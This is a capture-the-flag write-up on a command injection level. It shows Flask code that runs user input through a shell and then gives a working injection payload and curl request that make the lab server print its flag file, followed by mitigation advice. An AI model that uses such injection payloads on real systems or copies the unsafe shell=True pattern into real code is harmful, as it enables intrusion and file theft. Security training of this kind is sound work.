# 🧨 Web Security Challenge: Command Injection Level 1

## 🔎 Challenge Overview

This level explores **Command Injection**, a dangerous vulnerability that arises when a web application constructs a command string by embedding untrusted user input, then executes it in a shell environment.

The server code is written in Python using Flask, and it includes a route `/mission` that takes a query parameter `basepath` and builds a shell command using string interpolation:

```python
@app.route("/mission", methods=["GET"])
def challenge():
    arg = flask.request.args.get("basepath", "/challenge")
    command = f"ls -l {arg}"

    result = subprocess.run(
        command,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        encoding="latin",
    ).stdout
    ...
```

The key vulnerability is the use of:
- `shell=True` (enables shell parsing of input)
- Direct string formatting with user input (`f"ls -l {arg}"`)

This allows attackers to inject arbitrary shell commands.

---

## 🕳️ Vulnerability Explanation

The code intends to execute `ls -l` on a user-supplied path like `/home/user`, but does not sanitize or validate the input. If a user supplies a string like:

```
/challenge; cat /flag
```

The full shell command becomes:

```bash
ls -l /challenge; cat /flag
```

In Bash, `;` separates commands. So both `ls` and `cat` get executed sequentially. The second command (`cat /flag`) prints the contents of the flag file.

---

## 🧪 Exploit

The injected payload is:
```
/challenge;cat /flag
```

To safely send this in a browser or `curl`, we URL-encode it:
```
/challenge%3Bcat%20/flag
```

### ✅ Final Working Exploit:

```bash
curl "http://challenge.localhost/mission?basepath=/challenge%3Bcat%20/flag"
```

This triggers the following command on the server:
```bash
ls -l /challenge; cat /flag
```

And leaks the flag from `/flag`.

---

## 🛡️ Mitigation

To prevent command injection vulnerabilities:

1. **Avoid `shell=True`** — use the safer list format:
   ```python
   subprocess.run(["ls", "-l", user_input])
   ```
2. **Validate and sanitize input** — enforce strict whitelisting or use built-in APIs.
3. **Use parameterized interfaces** — avoid building strings manually.
4. **Never trust user input** — treat everything as malicious unless proven safe.

---

## 📚 Key Takeaways

- `shell=True` combined with unsanitized input is extremely dangerous.
- Command separators like `;`, `&&`, and `|` can be used for code injection.
- Always assume user input is hostile — even seemingly harmless parameters.

---
